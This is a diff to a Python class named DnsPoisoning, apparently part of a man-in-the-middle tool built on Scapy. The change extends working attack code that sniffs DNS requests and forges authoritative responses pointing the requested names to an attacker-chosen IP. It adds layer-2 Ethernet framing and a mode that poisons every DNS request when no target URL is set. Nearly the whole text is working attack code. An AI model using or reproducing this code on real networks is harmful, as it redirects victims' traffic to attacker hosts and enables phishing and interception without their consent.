@@ -17,22 +17,38 @@ class DnsPoisoning:
                 # check if the dns packet (is a request)
                 if (pkt[DNS].qr == 0):
                     # check if the dns packet concerns the target URL
-
-                    for link in url:
-                        if link in pkt[DNS].qd.qname:
-                            print("{} wants to connect to {} .".format(pkt[IP].src, link))
-                            # for a response revert destination and source
-                            fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-                            fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
-                            # fake query pointing the requested URL to the poison IP
-                            fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
-                            # fake DNS response
-                            fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
-                            # combine into complete packet
-                            poisonPacket = fakeIP / fakeUDP / fakeDNS
-                            # send the poison packet to the victim
-                            send(poisonPacket, verbose=0, iface=interface)
-                            print("Fake DNS response sent to {} .".format(poisonPacket[IP].dst))
+                    if len(url) == 0:
+                        print("{} sent a DNS request. ".format(pkt[IP].src))
+                        # for a response revert destination and source
+                        fakeEther = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
+                        fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+                        fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+                        # fake query pointing the requested URL to the poison IP
+                        fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
+                        # fake DNS response
+                        fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
+                        # combine into complete packet
+                        poisonPacket = fakeEther / fakeIP / fakeUDP / fakeDNS
+                        # send the poison packet to the victim
+                        sendp(poisonPacket, verbose=0, iface=interface)
+                        print("Fake DNS response sent to {} .".format(poisonPacket[IP].dst))
+                    else:
+                        for link in url:
+                            if link in pkt[DNS].qd.qname:
+                                print("{} wants to connect to {} .".format(pkt[IP].src, link))
+                                # for a response revert destination and source
+                                fakeEther = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)
+                                fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
+                                fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
+                                # fake query pointing the requested URL to the poison IP
+                                fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
+                                # fake DNS response
+                                fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
+                                # combine into complete packet
+                                poisonPacket = fakeEther / fakeIP / fakeUDP / fakeDNS
+                                # send the poison packet to the victim
+                                sendp(poisonPacket, verbose=0, iface=interface)
+                                print("Fake DNS response sent to {} .".format(poisonPacket[IP].dst))
 
         while not stop_event.is_set():
             for ip in target1:
